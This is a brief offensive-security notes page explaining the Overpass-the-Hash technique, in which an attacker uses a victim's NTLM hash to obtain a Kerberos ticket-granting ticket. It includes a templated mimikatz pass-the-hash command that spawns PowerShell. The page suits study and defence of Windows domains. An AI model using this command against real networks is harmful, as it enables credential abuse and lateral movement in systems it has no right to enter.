# Overpass The Hash

**Overpass the hash** is a lateral movement technique that uses the victim's NTLM hash in order to achieve Ticket Granting Ticket (TGT).

Then, using the TGT the attacker can request for service ticket for a service.

&#x20;An example of performing the attack using mimikatz:

{% code overflow="wrap" %}
```
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
```
{% endcode %}

